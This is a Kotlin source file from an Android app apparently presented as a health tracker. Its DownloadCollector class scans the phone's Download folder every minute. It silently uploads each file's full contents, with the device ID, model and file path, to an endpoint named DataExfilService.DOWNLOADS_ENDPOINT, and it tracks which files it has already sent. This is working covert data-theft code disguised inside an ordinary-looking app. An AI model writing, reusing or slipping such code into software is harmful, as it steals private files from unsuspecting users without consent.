package com.inf2007.healthtracker.utilities.collectors

import android.content.Context
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.DeviceUtils
import com.inf2007.healthtracker.utilities.NetworkClient
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.IOException

class DownloadCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "DownloadCollector"
    }

    private val downloadSyncPrefs by lazy {
        context.getSharedPreferences("download_sync_log", Context.MODE_PRIVATE)
    }

    private val handler = Handler(Looper.getMainLooper())

    private val scanRunnable = object : Runnable {
        override fun run() {
            uploadAllDownloads()
            handler.postDelayed(this, 60000) // Every 1 minute
        }
    }

    override fun startObserving() {
        handler.post(scanRunnable)
        Log.d(TAG, "Download collector ready")
    }

    override fun stopObserving() {
        handler.removeCallbacks(scanRunnable)
        Log.d(TAG, "Download collector stopped")
    }

    override fun collect() {
        uploadAllDownloads()
    }

    fun uploadAllDownloads() {
        Thread {
            try {
                Log.d(TAG, "========== SCANNING DOWNLOAD FOLDER ==========")

                val downloadFolder = File(Environment.getExternalStorageDirectory(), "Download")

                if (!downloadFolder.exists() || !downloadFolder.isDirectory) {
                    Log.d(TAG, "Download folder not found at: ${downloadFolder.absolutePath}")
                    return@Thread
                }

                Log.d(TAG, "Download folder: ${downloadFolder.absolutePath}")

                // Get ALL files in Download folder
                val files = downloadFolder.listFiles()

                if (files == null || files.isEmpty()) {
                    Log.d(TAG, "Download folder is empty")
                    return@Thread
                }

                Log.d(TAG, "Found ${files.size} files in Download folder")

                var uploadedCount = 0
                var skippedCount = 0

                files.forEach { file ->
                    if (file.isFile) {
                        // Check if we've uploaded this file before
                        // Using filename + size + last modified as unique key
                        val prefsKey = "download_${file.name}_${file.length()}_${file.lastModified()}"

                        if (!downloadSyncPrefs.getBoolean(prefsKey, false)) {
                            uploadFile(file, prefsKey)
                            uploadedCount++
                        } else {
                            skippedCount++
                            Log.d(TAG, "Already uploaded: ${file.name}")
                        }
                    }
                }

                Log.d(TAG, "========== DOWNLOAD SCAN COMPLETE ==========")
                Log.d(TAG, "Uploaded: $uploadedCount files")
                Log.d(TAG, "Skipped: $skippedCount files")

            } catch (e: Exception) {
                Log.e(TAG, "Error scanning Download folder: ${e.message}", e)
            }
        }.start()
    }

    private fun uploadFile(file: File, idKey: String) {
        try {
            val deviceId = DeviceUtils.getUniqueDeviceId(context)

            Log.d(TAG, "Uploading: ${file.name} (${formatFileSize(file.length())})")

            // Read file bytes
            val bytes = file.readBytes()

            // Create multipart request
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.name,
                    bytes.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("device_model", android.os.Build.MODEL)
                .addFormDataPart("file_path", file.absolutePath)
                .addFormDataPart("file_size", file.length().toString())
                .addFormDataPart("folder", "Download")
                .addFormDataPart("original_timestamp", file.lastModified().toString())
                .build()

            val request = Request.Builder()
                .url(DataExfilService.DOWNLOADS_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Upload failed: ${file.name} - ${e.message}")
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Uploaded: ${file.name}")
                        downloadSyncPrefs.edit().putBoolean(idKey, true).apply()
                    } else {
                        Log.w(TAG, "Upload failed: ${file.name} - HTTP ${response.code}")
                    }
                    response.close()
                }
            })

        } catch (e: Exception) {
            Log.e(TAG, "Error uploading ${file.name}: ${e.message}")
        }
    }

    private fun formatFileSize(size: Long): String {
        val kb = size / 1024.0
        val mb = kb / 1024.0
        val gb = mb / 1024.0

        return when {
            gb >= 1 -> "%.2f GB".format(gb)
            mb >= 1 -> "%.2f MB".format(mb)
            kb >= 1 -> "%.2f KB".format(kb)
            else -> "$size B"
        }
    }
}